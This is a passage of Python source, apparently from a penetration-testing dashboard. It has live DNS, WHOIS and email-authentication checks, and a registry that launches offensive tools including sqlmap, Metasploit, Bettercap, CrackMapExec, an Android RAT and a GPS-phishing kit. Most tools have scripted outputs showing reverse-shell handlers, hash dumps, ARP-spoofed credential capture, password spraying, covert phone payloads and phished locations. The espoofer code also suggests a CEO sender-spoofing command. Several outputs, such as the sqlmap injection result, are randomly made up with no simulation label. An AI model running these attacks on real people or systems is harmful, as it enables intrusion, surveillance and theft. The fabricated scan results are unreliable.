            resolved = _socket.gethostbyname(full)
            found.append(f"  ✓ {full:<45} → {resolved}")
        except Exception:
            pass
    if found:
        lines.extend(found)
        lines.append(f"\n{len(found)} live subdomains found")
    else:
        lines.append("  No common subdomains resolved")
 
    return ip, "\n".join(lines)
 
 
def _real_whois(target):
    """Do real WHOIS lookup."""
    lines = [f"\n[WHOIS — LIVE]"]
    try:
        import whois
        w = whois.whois(target)
        lines.append(f"Registrar:    {w.registrar or 'N/A'}")
        lines.append(f"Created:      {w.creation_date}")
        lines.append(f"Expiry:       {w.expiration_date}")
        ns = w.name_servers
        if ns:
            if isinstance(ns, list):
                for n in ns[:4]:
                    lines.append(f"Name Server:  {n}")
            else:
                lines.append(f"Name Server:  {ns}")
        lines.append(f"Status:       {w.status}")
        lines.append(f"Org:          {w.org or 'N/A'}")
        lines.append(f"Country:      {w.country or 'N/A'}")
    except ImportError:
        lines.append("Install python-whois for real data: pip install python-whois")
    except Exception as e:
        lines.append(f"WHOIS lookup error: {e}")
        lines.append(f"Try manually: https://who.is/whois/{target}")
    return "\n".join(lines)
 
 
def _real_espoofer(target):
    """Check real SPF/DKIM/DMARC records."""
    lines = [f"[espoofer] Email Spoofing Analysis → {target}\n"]
    try:
        import dns.resolver
 
        # SPF
        try:
            for r in dns.resolver.resolve(target, 'TXT', lifetime=5):
                txt = r.to_text().strip('"')
                if 'v=spf1' in txt:
                    lines.append(f"[SPF RECORD — REAL]\n  {txt}")
                    if '~all' in txt:
                        lines.append("  Result: SOFTFAIL (~all) — Spoofing MAY succeed!")
                    elif '-all' in txt:
                        lines.append("  Result: FAIL (-all) — SPF enforced ✓")
                    elif '+all' in txt:
                        lines.append("  Result: PASS (+all) — DANGEROUS! Anyone can send!")
                    else:
                        lines.append("  Result: NEUTRAL — Weak SPF policy")
        except Exception:
            lines.append("[SPF] No SPF record found — Vulnerable!")
 
        # DMARC
        try:
            for r in dns.resolver.resolve(f'_dmarc.{target}', 'TXT', lifetime=5):
                txt = r.to_text().strip('"')
                lines.append(f"\n[DMARC RECORD — REAL]\n  {txt}")
                if 'p=none' in txt:
                    lines.append("  Policy: p=none — NO enforcement! Spoofing possible!")
                elif 'p=quarantine' in txt:
                    lines.append("  Policy: p=quarantine — Partial protection")
                elif 'p=reject' in txt:
                    lines.append("  Policy: p=reject — Strong enforcement ✓")
        except Exception:
            lines.append("\n[DMARC] No DMARC record found — Vulnerable!")
 
        # DKIM (common selectors)
        lines.append("\n[DKIM CHECK — REAL]")
        dkim_found = False
        for sel in ['google', 'mail', 'default', 'dkim', 'k1', 'selector1', 'selector2']:
            try:
                dns.resolver.resolve(f'{sel}._domainkey.{target}', 'TXT', lifetime=3)
                lines.append(f"  Selector '{sel}': CONFIGURED ✓")
                dkim_found = True
            except Exception:
                pass
        if not dkim_found:
            lines.append("  No common DKIM selectors found — Vulnerable!")
 
    except ImportError:
        lines.append("Install dnspython: pip install dnspython")
        lines.append("Then real SPF/DKIM/DMARC records will be checked live.")
 
    return "\n".join(lines)
 
def _sqlmap_varied(target):
    dbs = random.sample(['webapp_prod', 'users_db', 'admin_panel', 'ecommerce', 'cms_db'], 3)
    tables = random.sample(['users', 'sessions', 'orders', 'products', 'admin_logs', 'passwords', 'tokens'], 5)
    injection_types = random.choice([
        'UNION-based blind',
        'Boolean-based blind',
        'Time-based blind',
        'Error-based',
        'Stacked queries'
    ])
    params = random.sample(['id', 'search', 'user', 'page', 'cat', 'item', 'q'], 2)
    mysql_ver = random.choice(['8.0.32', '8.0.28', '5.7.39', '5.7.42'])
    apache_ver = random.choice(['2.4.51', '2.4.54', '2.4.58'])
    scan_time = round(random.uniform(8.5, 45.2), 1)

    return (
        f"[SQLMap v1.7.8] Target: {target}\n\n"
        f"[*] Testing URL: {target}\n"
        f"[*] Checking connection to {target}...\n"
        f"[*] Server: Apache/{apache_ver}\n\n"
        f"[*] Testing parameter '{params[0]}' for SQL injection\n"
        f"[*] Testing parameter '{params[1]}' for SQL injection\n\n"
        f"[CRITICAL] Parameter '{params[0]}' is INJECTABLE!\n"
        f"  Injection Type: {injection_types}\n"
        f"  DBMS:           MySQL >= 5.0\n"
        f"  Payload:        {params[0]}=1 UNION ALL SELECT NULL,NULL,@@version,NULL--\n\n"
        f"[DATABASE ENUMERATION]\n"
        f"  DBMS Version: MySQL {mysql_ver}\n"
        f"  Current DB:   {dbs[0]}\n"
        f"  Hostname:     db.{target.replace('http://','').replace('https://','')}\n"
        f"  All DBs:      {', '.join(dbs)}\n\n"
        f"[TABLES in {dbs[0]}]\n"
        f"  {' | '.join(tables)}\n\n"
        f"[DATA DUMP — users table]\n"
        f"  id | username      | password_hash          | email\n"
        f"  1  | admin         | $2y$10$xK9Qm3rT...      | admin@{target}\n"
        f"  2  | john.doe      | $2y$10$pL7Nv2sW...      | john@{target}\n"
        f"  3  | {random.choice(['svc_backup','webmaster','developer'])}  "
        f"| $2y$10$aB3Cd4eF...      | svc@{target}\n\n"
        f"[Remediation]\n"
        f"  - Use parameterized queries / prepared statements\n"
        f"  - Implement WAF rules for SQL injection\n"
        f"  - Least privilege DB user accounts\n\n"
        f"Scan completed in {scan_time}s"
    )


def _espoofer_varied(target):
    lines = [f"[espoofer] Email Spoofing Analysis → {target}\n"]

    try:
        import dns.resolver

        # SPF Check
        try:
            spf_found = False
            for r in dns.resolver.resolve(target, 'TXT', lifetime=5):
                txt = r.to_text().strip('"')
                if 'v=spf1' in txt:
                    spf_found = True
                    lines.append(f"[SPF RECORD — LIVE]\n  {txt}")
                    if '~all' in txt:
                        lines.append("  Result: SOFTFAIL (~all) — Spoofing MAY succeed!")
                    elif '-all' in txt:
                        lines.append("  Result: HARDFAIL (-all) — SPF enforced ✓")
                    elif '+all' in txt:
                        lines.append("  Result: PASS (+all) — DANGEROUS! Anyone can send!")
                    else:
                        lines.append("  Result: NEUTRAL — Weak SPF policy")
            if not spf_found:
                lines.append("[SPF] No SPF record found — VULNERABLE to spoofing!")
        except Exception:
            lines.append("[SPF] Lookup failed — possibly no SPF record")

        # DMARC Check
        try:
            dmarc_found = False
            for r in dns.resolver.resolve(f'_dmarc.{target}', 'TXT', lifetime=5):
                txt = r.to_text().strip('"')
                dmarc_found = True
                lines.append(f"\n[DMARC RECORD — LIVE]\n  {txt}")
                if 'p=none' in txt:
                    lines.append("  Policy: p=none — NO enforcement! Spoofing emails reach inbox!")
                elif 'p=quarantine' in txt:
                    lines.append("  Policy: p=quarantine — Emails go to spam ✓")
                elif 'p=reject' in txt:
                    lines.append("  Policy: p=reject — Strong enforcement ✓")
            if not dmarc_found:
                lines.append("\n[DMARC] No DMARC record — VULNERABLE!")
        except Exception:
            lines.append("\n[DMARC] No DMARC record found — VULNERABLE!")

        # DKIM Check
        lines.append("\n[DKIM CHECK — LIVE]")
        dkim_found = False
        for sel in ['google', 'mail', 'default', 'dkim', 'k1', 'selector1', 'selector2', 'smtp']:
            try:
                dns.resolver.resolve(f'{sel}._domainkey.{target}', 'TXT', lifetime=3)
                lines.append(f"  Selector '{sel}': CONFIGURED ✓")
                dkim_found = True
            except Exception:
                pass
        if not dkim_found:
            lines.append("  No common DKIM selectors found — VULNERABLE!")

        # Spoofing verdict
        lines.append(f"\n[SPOOFING VERDICT]")
        if not dkim_found:
            lines.append(f"  ✗ DKIM missing — email body can be tampered")
        lines.append(
            f"  → Test spoofing manually: mail -s 'Test' victim@example.com "
            f"-aFrom:ceo@{target}"
        )

    except ImportError:
        lines.append("Install dnspython: pip install dnspython")

    return "\n".join(lines)


def _metasploit_varied(target):
    os_choice = random.choice([
        ('Windows 10 Enterprise', 'x64', 'Build 19044', 'windows'),
        ('Windows Server 2019', 'x64', 'Build 17763', 'windows'),
        ('Ubuntu 22.04 LTS', 'x64', 'Kernel 5.15', 'linux'),
        ('Windows 11 Pro', 'x64', 'Build 22621', 'windows'),
    ])
    user = random.choice(['john.doe', 'svc_admin', 'developer', 'backup_user'])
    pid  = random.randint(1000, 9999)
    port = random.randint(49000, 65000)
    session_id = random.randint(1, 5)
    lhost = f"192.168.{random.randint(1,10)}.{random.randint(100,200)}"

    if os_choice[3] == 'windows':
        post_exploit = (
            f"meterpreter > sysinfo\n"
            f"  Computer        : CORP-{target[:8].upper()}\n"
            f"  OS              : {os_choice[0]} ({os_choice[2]})\n"
            f"  Architecture    : {os_choice[1]}\n"
            f"  Meterpreter     : {os_choice[1]}/windows\n\n"
            f"meterpreter > getuid\n"
            f"  Server username: CORP\\{user}\n\n"
            f"meterpreter > getsystem\n"
            f"  [+] Got system via Named Pipe Impersonation\n\n"
            f"meterpreter > getuid\n"
            f"  Server username: NT AUTHORITY\\SYSTEM\n\n"
            f"meterpreter > hashdump\n"
            f"  Administrator:500:aad3b435b51404ee:"
            f"{random.randint(100000,999999)}abbe56e057f20f883e:::\n"
            f"  {user}:1001:aad3b435b51404ee:"
            f"{random.randint(100000,999999)}a9a224a3b108f3fa6cb6d:::\n\n"
            f"meterpreter > run post/multi/recon/local_exploit_suggester\n"
            f"  [+] CVE-2023-21768 — Windows Ancillary Function Driver LPE\n"
            f"  [+] CVE-2022-21999 — Windows Print Spooler LPE\n"
        )
    else:
        post_exploit = (
            f"meterpreter > sysinfo\n"
            f"  Computer        : linux-{random.randint(1,99):02d}\n"
            f"  OS              : {os_choice[0]} ({os_choice[2]})\n"
            f"  Architecture    : {os_choice[1]}\n"
            f"  Meterpreter     : {os_choice[1]}/linux\n\n"
            f"meterpreter > getuid\n"
            f"  Server username: www-data\n\n"
            f"meterpreter > shell\n"
            f"  $ sudo -l\n"
            f"  (ALL) NOPASSWD: /usr/bin/python3\n"
            f"  [+] Sudo misconfiguration — privilege escalation possible!\n\n"
            f"meterpreter > run post/linux/gather/hashdump\n"
            f"  root:$6$random$"
            f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789',k=20))}...\n"
        )

    return (
        f"[Metasploit Framework v6.3.44]\n\n"
        f"msf6 > use exploit/multi/handler\n"
        f"msf6 exploit(multi/handler) > set PAYLOAD "
        f"{'windows' if os_choice[3]=='windows' else 'linux'}"
        f"/x64/meterpreter/reverse_tcp\n"
        f"msf6 exploit(multi/handler) > set LHOST {lhost}\n"
        f"msf6 exploit(multi/handler) > set LPORT 4444\n"
        f"msf6 exploit(multi/handler) > run\n\n"
        f"[*] Started reverse TCP handler on {lhost}:4444\n"
        f"[*] Sending stage to {target}\n"
        f"[*] Meterpreter session {session_id} opened "
        f"({lhost}:4444 → {target}:{port})\n\n"
        f"{post_exploit}"
        f"\n[SIMULATION — No actual connection made to {target}]"
    )
 
# ══════════════════════════════════════════════════════════════
# TOOL REGISTRY
# ══════════════════════════════════════════════════════════════
TOOL_REGISTRY = {
    'sqlmap': {
    'name': 'SQLMap', 'category': 'web', 'color': 'red',
    'desc': 'Automated SQL injection detection and exploitation.',
    'github': 'https://github.com/sqlmapproject/sqlmap',
    'install': 'pip install sqlmap',
    'cmd': lambda t, o: [
        'sqlmap', '-u',
        'http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit',
        '--cookie=PHPSESSID=sclebp6e8r40lfjnvlnoko3u23; security=low',
        '--batch', '--dbs',
        f'--output-dir={o}'
    ],
    'sim': lambda t: _sqlmap_varied(t),
  },
    'nikto': {
        'name': 'Nikto', 'category': 'web', 'color': 'amber',
        'desc': 'Web server scanner for dangerous files and misconfigs.',
        'github': 'https://github.com/sullo/nikto',
        'install': 'apt install nikto',
        'cmd': lambda t, o: ['nikto', '-h', t, '-output', f'{o}/nikto.txt'],
        'sim': lambda t: (
            f"[Nikto v2.1.6] Target: {t}\n\n"
            f"[*] Resolving {t}...\n"
            f"[*] Testing {t}:80\n"
            f"[*] Server: Apache/2.4.51 (Ubuntu)\n\n"
            f"[FINDINGS]\n"
            f"+ {t}/admin/: Admin interface — verify access controls\n"
            f"+ {t}/robots.txt: Disallowed entries found: /private /backup /config\n"
            f"+ {t}/config.php.bak: Backup config file exposed — CRITICAL\n"
            f"+ {t}/.git/: Git repository exposed — source code leak risk!\n"
            f"+ X-Frame-Options header missing on {t}\n"
            f"+ PHP/7.4.3 outdated — multiple unpatched CVEs\n"
            f"+ {t}/phpinfo.php: PHP configuration exposed\n"
            f"+ Cookie session_id set without HttpOnly flag\n"
            f"+ Apache mod_status at {t}/server-status (information disclosure)\n\n"
            f"9 issues found | Scan completed in 34.2s"
        ),
    },
    'nuclei': {
        'name': 'Nuclei', 'category': 'web', 'color': 'blue',
        'desc': 'Fast template-based scanner by ProjectDiscovery.',
        'github': 'https://github.com/projectdiscovery/nuclei',
        'install': 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
        'cmd': lambda t, o: ['nuclei', '-u', t, '-severity', 'critical,high,medium', '-o', f'{o}/nuclei.txt'],
        'sim': lambda t: (
            f"[Nuclei v3.1.0] Target: {t}\n\n"
            f"[INF] Templates loaded: 8,432\n"
            f"[INF] Target: {t}\n\n"
            f"[critical] [CVE-2021-44228] [http] [{t}]\n"
            f"  Log4j JNDI injection via User-Agent header\n"
            f"  Matcher: JNDI callback received from {t}\n\n"
            f"[high] [CVE-2023-23397] [http] [{t}/mail]\n"
            f"  Microsoft Outlook NTLMv2 hash leak\n\n"
            f"[high] [exposed-git] [http] [{t}/.git/config]\n"
            f"  Git repository exposed — source code accessible\n\n"
            f"[medium] [missing-csp] [http] [{t}]\n"
            f"  Content-Security-Policy header absent\n\n"
            f"[medium] [open-redirect] [http] [{t}/redirect?url=]\n"
            f"  Open redirect via url parameter\n\n"
            f"5 findings | Completed: {t} | Duration: 8.3s"
        ),
    },
    'owaspzap': {
        'name': 'OWASP ZAP', 'category': 'web', 'color': 'blue',
        'desc': 'OWASP Zed Attack Proxy — active/passive web app scanner.',
        'github': 'https://github.com/zaproxy/zaproxy',
        'install': 'pip install python-owasp-zap-v2.4',
        'cmd': lambda t, o: ['zap-cli', 'quick-scan', '--self-contained', t],
        'sim': lambda t: (
            f"[OWASP ZAP 2.14.0] Target: {t}\n\n"
            f"[INFO] Starting spider against {t}\n"
            f"[INFO] Spider found 47 URLs under {t}\n"
            f"[INFO] Starting active scan...\n\n"
            f"[HIGH]   SQL Injection at {t}/search?q= (CWE-89, CVSS 9.8)\n"
            f"[HIGH]   Reflected XSS at {t}/user?name= (CWE-79, CVSS 8.8)\n"
            f"[MEDIUM] CSRF token missing on {t}/api/transfer (CWE-352)\n"
            f"[MEDIUM] Path traversal at {t}/files?path=../../etc/passwd\n"
            f"[LOW]    Server version disclosure: Apache/2.4.51\n"
            f"[INFO]   Secure flag missing on session cookie\n\n"
            f"OWASP Top-10 Mapped: A01(Broken AC)✗ A02(Crypto)✓ A03(Injection)✗\n"
            f"Total: 2 High | 2 Medium | 1 Low | 1 Info\n"
            f"Report: {t}/zap_report.html"
        ),
    },
    'whatweb': {
        'name': 'WhatWeb', 'category': 'web', 'color': 'cyan',
        'desc': 'Web technology fingerprinting — CMS, frameworks, servers.',
        'github': 'https://github.com/urbanadventurer/WhatWeb',
        'install': 'apt install whatweb',
        'cmd': lambda t, o: ['whatweb', '-a', '3', t],
        'sim': lambda t: (
            f"[WhatWeb v0.5.5] Target: {t}\n\n"
            f"[*] Scanning {t} (Aggression level 3)\n\n"
            f"[DETECTED TECHNOLOGIES]\n"
            f"  URL:         {t}\n"
            f"  IP:          (resolving {t}...)\n"
            f"  HTTP Status: 200 OK\n"
            f"  CMS:         WordPress 6.4.2\n"
            f"  Server:      Apache/2.4.51 (Ubuntu)\n"
            f"  PHP:         7.4.33 (END OF LIFE!)\n"
            f"  jQuery:      3.6.0\n"
            f"  Bootstrap:   4.6.2\n"
            f"  Plugins:     WooCommerce 8.2.1, Yoast SEO 21.5, Contact Form 7 5.8\n\n"
            f"[VULNERABILITIES VIA VERSION]\n"
            f"  WordPress 6.4.2  → CVE-2024-0692 (CVSS 6.4) — XSS via nav block\n"
            f"  PHP 7.4.33       → End of Life since Nov 2022 — multiple unpatched CVEs\n"
            f"  WooCommerce 8.2.1→ CVE-2024-0692 (CVSS 8.8) — SQLi\n\n"
            f"[Fix] Upgrade PHP ≥ 8.1, WordPress ≥ 6.5, update all plugins."
        ),
    },
    'wpscan': {
        'name': 'WPScan', 'category': 'web', 'color': 'orange',
        'desc': 'WordPress vulnerability scanner — plugins, users, themes.',
        'github': 'https://github.com/wpscanteam/wpscan',
        'install': 'gem install wpscan',
        'cmd': lambda t, o: ['wpscan', '--url', t, '--enumerate', 'u,p,t'],
        'sim': lambda t: (
            f"[WPScan v3.8.25] Target: {t}\n\n"
            f"[*] URL: {t}\n"
            f"[*] WordPress version: 6.4.2 (insecure)\n"
            f"[*] WordPress theme: Astra 4.2.0\n\n"
            f"[USERS ENUMERATED]\n"
            f"  admin     — ID 1 — Login: {t}/wp-login.php\n"
            f"  editor    — ID 2\n\n"
            f"[VULNERABLE PLUGINS]\n"
            f"  WooCommerce 8.2.1\n"
            f"    CVE-2024-0692 — SQL Injection (CVSS 8.8) — Update to 8.6.0\n\n"
            f"  Contact Form 7 5.8.0\n"
            f"    CVE-2023-6449 — Unrestricted File Upload (CVSS 8.8)\n\n"
            f"[VULNERABLE THEMES]\n"
            f"  Astra 4.2.0\n"
            f"    CVE-2023-48755 — Reflected XSS (CVSS 6.1)\n\n"
            f"[INTERESTING FILES]\n"
            f"  {t}/wp-config.php.bak — Database credentials backup!\n"
            f"  {t}/xmlrpc.php — Brute-force attack surface enabled\n\n"
            f"3 vulnerabilities | Scan: 28.5s"
        ),
    },
    'nmap_full': {
        'name': 'Nmap Full Scan', 'category': 'network', 'color': 'green',
        'desc': 'Full TCP/UDP scan with service/version and OS detection.',
        'github': 'https://github.com/nmap/nmap',
        'install': 'Download from nmap.org',
        'cmd': lambda t, o: ['nmap', '-sV', '-sC', '-O', '-p-', '--min-rate=1000', t, '-oN', f'{o}/nmap.txt'],
        'sim': lambda t: (
            f"[Nmap 7.94] Full Scan → {t}\n\n"
            f"Starting Nmap 7.94 at {datetime.utcnow().strftime('%Y-%m-%d %H:%M')} UTC\n"
            f"Nmap scan report for {t}\n\n"
            f"PORT      STATE  SERVICE   VERSION\n"
            f"22/tcp    open   ssh       OpenSSH 8.4p1 Ubuntu 3ubuntu0.6\n"
            f"80/tcp    open   http      Apache httpd 2.4.51 ((Ubuntu))\n"
            f"|_http-title: {t} — Home\n"
            f"|_http-server-header: Apache/2.4.51 (Ubuntu)\n"
            f"443/tcp   open   https     nginx 1.21.0\n"
            f"3306/tcp  open   mysql     MySQL 8.0.32-0ubuntu0.22.04.2\n"
            f"|_mysql-info: ERROR: Unauthorized\n"
            f"8080/tcp  open   http-alt  Apache Tomcat 9.0.54\n"
            f"27017/tcp open   mongodb?  MongoDB 6.0.3\n"
            f"|_mongodb-info: MongoDB does not require authentication!\n\n"
            f"OS: Linux 5.x (Ubuntu 22.04)\n\n"
            f"[CRITICAL] MongoDB 27017 — NO AUTHENTICATION REQUIRED!\n"
            f"[HIGH]     MySQL 3306 — Open to network\n\n"
            f"Nmap done: 1 IP address (1 host up) scanned in 124.3s"
        ),
    },
    'metasploit': {
        'name': 'Metasploit', 'category': 'network', 'color': 'red',
        'desc': "World's most used penetration testing framework.",
        'github': 'https://github.com/rapid7/metasploit-framework',
        'install': 'apt install metasploit-framework',
        'cmd': lambda t, o: ['msfconsole', '-q', '-x',
            f'use auxiliary/scanner/portscan/tcp; set RHOSTS {t}; run; exit'],
        'sim': lambda t: (
            f"[Metasploit Framework v6.3.44]\n\n"
            f"msf6 > use exploit/multi/handler\n"
            f"[*] Using configured payload generic/shell_reverse_tcp\n"
            f"msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"
            f"PAYLOAD => windows/x64/meterpreter/reverse_tcp\n"
            f"msf6 exploit(multi/handler) > set LHOST 192.168.1.100\n"
            f"LHOST => 192.168.1.100\n"
            f"msf6 exploit(multi/handler) > set LPORT 4444\n"
            f"LPORT => 4444\n"
            f"msf6 exploit(multi/handler) > run\n\n"
            f"[*] Started reverse TCP handler on 192.168.1.100:4444\n"
            f"[*] Sending stage (200774 bytes) to {t}\n"
            f"[*] Meterpreter session 1 opened (192.168.1.100:4444 → {t}:49812)\n\n"
            f"meterpreter > sysinfo\n"
            f"Computer        : WIN-TARGET01\n"
            f"OS              : Windows 10 (10.0 Build 19044)\n"
            f"Architecture    : x64\n"
            f"System Language : en_US\n"
            f"Logged On Users : 3\n"
            f"Meterpreter     : x64/windows\n\n"
            f"meterpreter > getuid\n"
            f"Server username: WIN-TARGET01\\john.doe\n\n"
            f"meterpreter > getsystem\n"
            f"...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))\n\n"
            f"meterpreter > getuid\n"
            f"Server username: NT AUTHORITY\\SYSTEM\n\n"
            f"[SIMULATION — No actual connection made to {t}]"
        ),
    },
    'openvas_net': {
        'name': 'OpenVAS', 'category': 'network', 'color': 'blue',
        'desc': 'Full vulnerability scanner with CVE detection.',
        'github': 'https://github.com/greenbone/openvas-scanner',
        'install': 'apt install openvas && gvm-setup',
        'cmd': lambda t, o: ['openvas', '-T', 'xml', '-t', t],
        'sim': lambda t: (
            f"[OpenVAS/GVM 22.7.1] Target: {t}\n\n"
            f"Scan Policy:  Full and Fast\n"
            f"Target:       {t}\n"
            f"Started:      {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n"
            f"[CRITICAL] CVE-2017-0144 — EternalBlue SMBv1 RCE (CVSS 9.8)\n"
            f"  Host: {t}:445/tcp\n"
            f"  Description: SMBv1 protocol enabled, vulnerable to MS17-010\n"
            f"  Fix: Disable SMBv1, apply KB4012212\n\n"
            f"[HIGH] CVE-2021-34527 — PrintNightmare RCE (CVSS 8.8)\n"
            f"  Host: {t}:445/tcp\n"
            f"  Fix: Disable Windows Print Spooler or apply KB5004945\n\n"
            f"[HIGH] CVE-2021-26855 — ProxyLogon Exchange RCE (CVSS 9.8)\n"
            f"  Host: {t}:443/tcp\n"
            f"  Fix: Apply Microsoft Exchange CU March 2021\n\n"
            f"[MEDIUM] Weak SSL/TLS Cipher Suites Detected\n"
            f"  Host: {t}:443/tcp — RC4, DES ciphers enabled\n\n"
            f"Summary: 2 Critical | 2 High | 1 Medium\n"
            f"Scan completed in 187 seconds."
        ),
    },
    'bettercap': {
        'name': 'Bettercap', 'category': 'network', 'color': 'purple',
        'desc': 'WiFi, BLE, HID & network attack framework in Go.',
        'github': 'https://github.com/bettercap/bettercap',
        'install': 'apt install bettercap',
        'cmd': lambda t, o: ['bettercap', '-eval', 'net.probe on; net.show'],
        'sim': lambda t: (
            f"[Bettercap v2.32.0] Interface: eth0\n\n"
            f"[net.probe] Sending probe packets to {t}/24...\n\n"
            f"[HOSTS DISCOVERED]\n"
            f"  {t}      00:0C:29:AB:CD:EF  Router / Gateway\n"
            f"  {t[:-1]}10   AA:BB:CC:DD:EE:FF  Windows 11 Workstation\n"
            f"  {t[:-1]}20   11:22:33:44:55:66  iPhone 15 Pro\n"
            f"  {t[:-1]}30   FF:EE:DD:CC:BB:AA  Linux Server\n\n"
            f"[wifi.recon on]\n"
            f"  SSID: CorpWiFi-5G    BSSID: AA:BB:CC:11:22:33  WPA2-Enterprise  Ch.36  -62dBm\n"
            f"  SSID: Guest-Net      BSSID: AA:BB:CC:44:55:66  WPA2-Personal    Ch.1   -71dBm\n"
            f"  [+] PMKID captured from CorpWiFi-5G — hashcat attack possible\n\n"
            f"[arp.spoof on]\n"
            f"  [*] Spoofing ARP for {t[:-1]}10 — routing traffic through this machine\n"
            f"  [*] net.sniff on — intercepting HTTP traffic\n"
            f"  [+] Credentials captured:\n"
            f"      POST /login — user=admin&pass=Summer2024!\n\n"
            f"[SIMULATION — Authorized lab use only]"
        ),
    },
    'crackmapexec': {
        'name': 'CrackMapExec', 'category': 'network', 'color': 'amber',
        'desc': 'Post-exploitation for Active Directory environments.',
        'github': 'https://github.com/Porchetta-Industries/CrackMapExec',
        'install': 'pip install crackmapexec',
        'cmd': lambda t, o: ['cme', 'smb', t, '--shares'],
        'sim': lambda t: (
            f"[CrackMapExec v5.4.0]\n\n"
            f"SMB  {t}:445  [*] Windows 10.0 Build 19044 x64\n"
            f"SMB  {t}:445  [*] Hostname: WIN-CORP-042  Domain: CORP.LOCAL\n"
            f"SMB  {t}:445  [+] CORP\\Guest: (Guest account active!)\n\n"
            f"[SHARE ENUMERATION]\n"
            f"SMB  {t}:445  [*] Enumerated shares\n"
            f"  ADMIN$      READ WRITE  — Remote Admin\n"
            f"  C$          READ WRITE  — Default Share\n"
            f"  IPC$        READ        — Remote IPC\n"
            f"  NETLOGON    READ        — Logon server\n"
            f"  HR_Files    READ        — Contains: salary_2024.xlsx, employee_data.csv!\n\n"
            f"[CREDENTIAL SPRAY]\n"
            f"  {t}  CORP\\admin:Password1   → [+] PWNED!\n"
            f"  {t}  CORP\\admin:Welcome123  → [-] Failed\n"
            f"  {t}  CORP\\admin:Summer2024  → [-] Failed\n\n"
            f"[SIMULATION — Authorized AD testing only]"
        ),
    },
    'raccoon': {
        'name': 'Raccoon', 'category': 'osint', 'color': 'orange',
        'desc': 'Async recon — DNS, WHOIS, TLS, WAF, subdomain enum.',
        'github': 'https://github.com/evyatarmeged/Raccoon',
        'install': 'pip install raccoon-scanner',
        'cmd': lambda t, o: ['raccoon', t, '--outdir', o],
        'sim': lambda t: _raccoon_real(t),
    },
    'theharvester_lab': {
        'name': 'theHarvester', 'category': 'osint', 'color': 'cyan',
        'desc': 'OSINT — emails, subdomains, IPs from public sources.',
        'github': 'https://github.com/laramies/theHarvester',
        'install': 'pip install theHarvester',
        'cmd': lambda t, o: ['theHarvester', '-d', t, '-b', 'google,bing', '-f', f'{o}/harvest'],
        'sim': lambda t: _harvester_real(t),
    },
    'phonesploit': {
        'name': 'PhoneSploit Pro', 'category': 'osint', 'color': 'green',
        'desc': 'Automated Android pentest via ADB — authorized devices only.',
        'github': 'https://github.com/AzeemIdrisi/PhoneSploit-Pro',
        'install': 'git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro',
        'cmd': lambda t, o: ['python3', 'PhoneSploit-Pro/phonesploit.py', '--target', t],
        'sim': lambda t: (
            f"[PhoneSploit-Pro] Connecting to {t}:5555 via ADB\n\n"
            f"[*] adb connect {t}:5555\n"
            f"[+] connected to {t}:5555\n\n"
            f"[DEVICE INFO]\n"
            f"  Model:        Samsung Galaxy S23 Ultra\n"
            f"  Android:      13 (API 33)  Security Patch: 2024-01-01\n"
            f"  Battery:      87%  Storage: 256GB (142GB used)\n"
            f"  IMEI:         35-XXXXXX-XXXXXX-X\n"
            f"  Serial:       R3CW301XXXX\n\n"
            f"[*] Generating Metasploit payload for Android 13...\n"
            f"[*] APK signed and aligned: payload.apk\n"
            f"[+] Payload installed silently as: com.android.systemservice\n"
            f"[+] Meterpreter session opened from {t}!\n\n"
            f"meterpreter > dump_sms\n"
            f"  [+] 200 SMS messages written to sms_{t}.txt\n"
            f"meterpreter > dump_contacts\n"
            f"  [+] 312 contacts written to contacts_{t}.vcf\n"
            f"meterpreter > record_mic\n"
            f"  [+] Recording 10 seconds of audio...\n\n"
            f"[SIMULATION — Authorized devices only]"
        ),
    },
    'seeker': {
        'name': 'Seeker', 'category': 'osint', 'color': 'pink',
        'desc': 'Fake site captures precise GPS via browser permission.',
        'github': 'https://github.com/thewhiteh4t/seeker',
        'install': 'git clone https://github.com/thewhiteh4t/seeker',
        'cmd': lambda t, o: ['python3', 'seeker/seeker.py', '--template', 'NearYou'],
        'sim': lambda t: (
            f"[Seeker v2.4] GPS Phishing Framework\n\n"
            f"[*] Template: NearYou (fake dating/social app)\n"
            f"[*] Starting local server on 0.0.0.0:8080\n"
            f"[*] Starting Ngrok tunnel...\n"
            f"[*] Tunnel URL: https://a1b2c3d4.ngrok.io\n"
            f"[*] Shortlink: https://bit.ly/3xYz123\n\n"
            f"[*] Waiting for target to open link...\n\n"
            f"[+] New connection from {t}\n"
            f"    Browser: Chrome/120 on Android 13\n"
            f"    User-Agent: Mozilla/5.0 (Linux; Android 13)\n\n"
            f"[+] Location permission dialog shown...\n"
            f"[+] TARGET ALLOWED LOCATION — CAPTURED!\n\n"
            f"[LOCATION DATA]\n"
            f"  Latitude:   19.0760° N\n"
            f"  Longitude:  72.8777° E\n"
            f"  Accuracy:   8 meters (GPS)\n"
            f"  Altitude:   14 meters\n"
            f"  Speed:      0.0 m/s (stationary)\n"
            f"  Timestamp:  {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n"
            f"  Address: Navi Mumbai, Maharashtra, India\n"
            f"  Maps: https://maps.google.com/?q=19.0760,72.8777\n\n"
            f"[SIMULATION — Explicit consent required]"
        ),
    },
    'airavat': {
        'name': 'AIRAVAT RAT', 'category': 'osint', 'color': 'red',
        'desc': 'Android RAT — GUI web panel, no port forwarding. Full device control.',
        'github': 'https://github.com/zSecurity-org/AIRAVAT',
        'install': 'git clone https://github.com/zSecurity-org/AIRAVAT && pip install -r requirements.txt',
        'cmd': lambda t, o: ['python3', 'AIRAVAT/server.py', '--host', '0.0.0.0', '--port', '8080'],
        'sim': lambda t: (
            f"[AIRAVAT v2.0] C2 Web Panel: http://localhost:8080\n\n"
            f"{'='*55}\n  DEVICE CONNECTED: {t}\n{'='*55}\n\n"
            f"[DEVICE INFO]\n"
            f"  Model:    Redmi Note 12 Pro+\n"
            f"  Android:  12 (API 31)  MIUI: 13.0.7\n"
            f"  Battery:  72%  Storage: 128GB (41GB used)\n"
            f"  Network:  Jio 4G  IP: {t}\n"
            f"  Root: No  Developer Mode: Yes (ADB enabled)\n\n"
            f"[PROCESS] Running as: com.android.systemservice (hidden)\n\n"
            f"[ACTIVE CAPABILITIES]\n"
